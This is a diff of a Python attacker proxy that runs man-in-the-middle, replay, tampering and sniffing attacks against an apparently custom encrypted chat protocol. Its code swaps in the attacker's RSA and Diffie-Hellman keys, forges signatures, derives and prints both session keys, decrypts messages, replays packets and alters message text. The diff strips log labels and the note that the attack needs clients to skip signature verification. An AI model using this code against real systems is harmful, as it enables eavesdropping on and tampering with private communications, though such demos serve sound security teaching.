@@ -13,11 +13,11 @@ DO_SNIFF = "--sniff" in args
 if not any([DO_MITM, DO_REPLAY, DO_TAMPER, DO_SNIFF]):
     DO_MITM = DO_REPLAY = DO_TAMPER = DO_SNIFF = True
 
-def atk(msg): print(f"[ATTACKER] {msg}", flush=True)
-def plain(msg): print(f"[PLAINTEXT] {msg}", flush=True)
+def atk(msg): print(f"{msg}", flush=True)
+def plain(msg): print(f"{msg}", flush=True)
 def sniff_log(direction, data):
     if DO_SNIFF:
-        atk(f"[SNIFF] {direction} | {len(data)} bytes | {data[:32].hex()}...")
+        atk(f"{direction} | {len(data)} bytes | {data[:32].hex()}...")
 
 from cryptography.hazmat.primitives.asymmetric.rsa import generate_private_key
 from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
@@ -92,7 +92,6 @@ def tamper_payload_raw(payload: bytes) -> bytes:
         ct = bytearray(base64.b64decode(pkt["ciphertext"]))
         ct[8] ^= 0xFF
         pkt["ciphertext"] = base64.b64encode(bytes(ct)).decode()
-        atk("[TAMPER] Flipped byte 8 in ciphertext (raw)!")
         return json.dumps(pkt).encode()
     except Exception as e:
         atk(f"[TAMPER] Failed: {e}")
@@ -105,13 +104,12 @@ def handle_client_connection(client_sock, client_addr):
     server_sock.connect((SERVER_HOST, SERVER_PORT))
     atk("Connected to real server.")
 
-    c_aes = c_hmac = None # attacker <-> client keys
-    s_aes = s_hmac = None # attacker <-> server keys
+    c_aes = c_hmac = None 
+    s_aes = s_hmac = None 
 
     try:
         # Server hello -> client (intercept RSA pub)
         _, srv_hello_raw = recv_raw_packet(server_sock)
-        sniff_log("S->A (server hello)", srv_hello_raw)
         srv_hello = json.loads(srv_hello_raw)
         dh_params_pem = srv_hello["dh_params"]
 
@@ -120,20 +118,18 @@ def handle_client_connection(client_sock, client_addr):
         )
 
         if DO_MITM:
-            atk("[MITM] Replacing server RSA pub with attacker's in server hello.")
-            fwd = json.dumps({"server_rsa_pub": atk_rsa_pub_pem,
-                              "dh_params": dh_params_pem}).encode()
+            atk("Replacing server RSA pub with attacker's")
+            fwd = json.dumps({"server_rsa_pub": atk_rsa_pub_pem, "dh_params": dh_params_pem}).encode()
         else:
             fwd = srv_hello_raw
         send_raw(client_sock, fwd)
 
         # Client hello -> server (intercept DH pub, substitute attacker's)
         _, cli_hello_raw = recv_raw_packet(client_sock)
-        sniff_log("C->A (client hello)", cli_hello_raw)
         cli_hello = json.loads(cli_hello_raw)
         username = cli_hello.get("username", "?")
         cli_dh_pub_pem = cli_hello["client_dh_pub"]
-        atk(f"[MITM] Intercepted client hello for user: {username}")
+        atk(f"Intercepted client hello for user: {username}")
 
         cli_dh_pub = serialization.load_pem_public_key(
             cli_dh_pub_pem.encode(), backend=default_backend()
@@ -157,7 +153,6 @@ def handle_client_connection(client_sock, client_addr):
 
         # Server DH pub + sig -> client (substitute attacker's DH pub)
         _, srv_dh_raw = recv_raw_packet(server_sock)
-        sniff_log("S->A (server DH pub + sig)", srv_dh_raw)
         srv_dh_msg = json.loads(srv_dh_raw)
         srv_dh_pub_pem = srv_dh_msg["server_dh_pub"]
 
@@ -169,7 +164,7 @@ def handle_client_connection(client_sock, client_addr):
             # Derive attacker<->server session keys
             shared_with_server = atk_dh_priv_srv.exchange(srv_dh_pub)
             s_aes, s_hmac = derive_keys(shared_with_server)
-            atk(f"[MITM] Attacker<->Server AES key: {s_aes.hex()}")
+            atk(f"{s_aes.hex()}")
 
             # Attacker DH keypair for the CLIENT side of the tunnel
             atk_dh_priv_cli = dh_params.generate_private_key()
@@ -181,38 +176,35 @@ def handle_client_connection(client_sock, client_addr):
             # Derive attacker<->client session keys
             shared_with_client = atk_dh_priv_cli.exchange(cli_dh_pub)
             c_aes, c_hmac = derive_keys(shared_with_client)
-            atk(f"[MITM] Attacker<->Client AES key: {c_aes.hex()}")
+            atk(f"{c_aes.hex()}")
 
             # Send client our DH pub signed with our RSA key
             fake_sig = atk_rsa_priv.sign(
                 atk_dh_pub_cli_pem.encode(),
-                asym_padding.PSS(mgf=asym_padding.MGF1(hashes.SHA256()),
-                                 salt_length=asym_padding.PSS.MAX_LENGTH),
+                asym_padding.PSS(mgf=asym_padding.MGF1(hashes.SHA256()), salt_length=asym_padding.PSS.MAX_LENGTH),
                 hashes.SHA256()
             )
             fwd_dh = json.dumps({
                 "server_dh_pub": atk_dh_pub_cli_pem,
                 "signature": base64.b64encode(fake_sig).decode()
             }).encode()
-            atk("[MITM] Sent attacker DH pub + fake sig to client.")
+            atk("Sent attacker DH public and fake sig to client.")
         else:
             fwd_dh = srv_dh_raw
         send_raw(client_sock, fwd_dh)
 
         # Client sig -> server (re-sign with attacker's RSA key)
         _, cli_sig_raw = recv_raw_packet(client_sock)
-        sniff_log("C->A (client sig)", cli_sig_raw)
+        sniff_log("client sig ", cli_sig_raw)
 
         if DO_MITM:
             atk_sig = atk_rsa_priv.sign(
                 atk_dh_pub_srv_pem.encode(),
-                asym_padding.PSS(mgf=asym_padding.MGF1(hashes.SHA256()),
-                                 salt_length=asym_padding.PSS.MAX_LENGTH),
+                asym_padding.PSS(mgf=asym_padding.MGF1(hashes.SHA256()), salt_length=asym_padding.PSS.MAX_LENGTH),
                 hashes.SHA256()
             )
             fwd_sig = json.dumps({"signature": base64.b64encode(atk_sig).decode()}).encode()
-            atk("[MITM] Double-DH handshake complete! Attacker holds BOTH session key pairs.")
-            atk("       Every message will be decrypted and shown in plaintext.\n")
+            atk("handshake complete")
         else:
             fwd_sig = cli_sig_raw
         send_raw(server_sock, fwd_sig)
@@ -242,7 +234,7 @@ def handle_client_connection(client_sock, client_addr):
                                 plain(f"{direction} | from={msg.get('sender', username)!r} "
                                       f"seq={msg.get('seq','?')} | \"{msg.get('text','')}\"")
                             elif mtype == "system":
-                                plain(f"{direction} | [SYSTEM] {msg.get('text','')}")
+                                plain(f"{direction} | {msg.get('text','')}")
                             else:
                                 plain(f"{direction} | {json.dumps(msg)}")
 
@@ -252,15 +244,15 @@ def handle_client_connection(client_sock, client_addr):
                                 # is valid from the server's perspective
                                 server_encrypted = encrypt_packet(msg, enc_aes, enc_hmac)
                                 replay_buffer.append(server_encrypted)
-                                atk(f"[REPLAY] Recorded packet #{len(replay_buffer)} seq={msg.get('seq','?')} text={msg.get('text','')!r}")
+                                atk(f"Recorded packet #{len(replay_buffer)} seq={msg.get('seq','?')} text={msg.get('text','')!r}")
                                 if len(replay_buffer) == 2:
-                                    atk("[REPLAY] Injecting replay of packet #1 to server NOW!")
+                                    atk("Injecting replay of packet #1 to server")
                                     dst.sendall(len(replay_buffer[0]).to_bytes(4, "big") + replay_buffer[0])
 
                             # Tamper: alter every message text, re-encrypt
                             if direction.startswith("C") and DO_TAMPER and mtype == "message":
                                 original = msg["text"]
-                                msg["text"] = msg["text"] + " [TAMPERED by attacker]"
+                                msg["text"] = msg["text"] + " [TAMPERED]"
                                 atk(f"[TAMPER] {original!r} -> {msg['text']!r}")
                                 forward_payload = encrypt_packet(msg, enc_aes, enc_hmac)
                                 dst.sendall(len(forward_payload).to_bytes(4, "big") + forward_payload)
@@ -280,9 +272,9 @@ def handle_client_connection(client_sock, client_addr):
 
                         if direction.startswith("C") and DO_REPLAY:
                             replay_buffer.append(payload)
-                            atk(f"[REPLAY] Recorded packet #{len(replay_buffer)}")
+                            atk(f"Recorded packet #{len(replay_buffer)}")
                             if len(replay_buffer) == 2:
-                                atk("[REPLAY] Injecting replay of packet #1!")
+                                atk("Injecting replay")
                                 dst.sendall(len(replay_buffer[0]).to_bytes(4, "big") + replay_buffer[0])
 
                     dst.sendall(len(forward_payload).to_bytes(4, "big") + forward_payload)
@@ -321,13 +313,9 @@ def handle_client_connection(client_sock, client_addr):
 
 
 def main():
-    print("=" * 60)
-    print(" ATTACKER PROXY")
-    print(f" Listening {ATTACKER_HOST}:{ATTACKER_PORT} -> Server {SERVER_HOST}:{SERVER_PORT}")
-    print(f" MITM={DO_MITM} REPLAY={DO_REPLAY} TAMPER={DO_TAMPER} SNIFF={DO_SNIFF}")
-    print("=" * 60)
-    atk("MITM requires: python client.py <name> --port 8888 --skip-sig-verify")
-    atk("MITM blocked with: python client.py <name> --port 8888 (uses pinned key)\n")
+    print("ATTACKER PROXY")
+    print(f"Listening {ATTACKER_HOST}:{ATTACKER_PORT} | Server {SERVER_HOST}:{SERVER_PORT}")
+    print(f"MITM={DO_MITM} REPLAY={DO_REPLAY} TAMPER={DO_TAMPER} SNIFF={DO_SNIFF}")
 
     proxy = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     proxy.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
